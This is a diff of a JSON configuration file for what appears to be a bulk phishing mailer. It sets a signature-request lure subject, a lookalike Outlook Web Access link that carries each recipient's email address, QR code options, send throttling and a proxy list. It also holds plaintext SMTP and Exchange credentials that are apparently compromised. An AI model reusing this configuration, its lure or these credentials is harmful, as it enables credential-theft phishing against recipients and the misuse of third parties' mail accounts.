@@ -1,23 +1,15 @@
 {
-      "use_single_smtp": false,
-  "single_smtp": "",
-  "single_smtp_sender_email": "anna.lakatos@lagence.com",
+  "use_single_smtp": true,
+  "single_smtp": "netsol-smtp-oxcs.hostingplatform.com|587|valmoise@psy-test.com|Brahmaputra25!",
+  "single_smtp_sender_email": "valmoise@psy-test.com",
+  "sender_email": "valmoise@psy-test.com",
   "use_tls": true,
   "smtp_sleep_time": 7,
   "smtp_pause_num": 8,
-  "sender_names": [
- "Steven Bass"
- 
- ],
+  "sender_name": ["Steven Bass"],
   "repply_to": "info@nunez.io",
-  "subjects": [
-"Quick Signature Request: Please Review and Sign #{RECIPIENT_DOMAIN_NAME}"
-    
-],
-  "links": [   
-  "https://east-exch02910-serverdata-net.geodjs.com/owa#{RECIPIENT_EMAIL}"
-
-  ],
+  "subjects": ["Quick Signature Request: Please Review and Sign #{RECIPIENT_DOMAIN_NAME}"],
+  "links": ["https://east-exch02910-serverdata-net.geodjs.com/owa#{RECIPIENT_EMAIL}"],
   "format_type": "F1",
   "send_attachment": false,
   "attachment_path": "Attach/message.html",
@@ -28,9 +20,9 @@
   "qrcode_bg_color": "white",
   "qrcode_logo": "gray",
   "use_html_to_image": false,
-	"format_folder": "absolute/path/to/folder",
+  "format_folder": "format",
   "email_priority": "high",
-  "use_exchangelib": true,
+  "use_exchangelib": false,
   "exchange_server": "west.exch081.serverdata.net|MFish@thegrandhealthcare.com|Winter@2020#",
   "use_proxy": false,
   "proxy_list_file": "proxies/ip.txt",
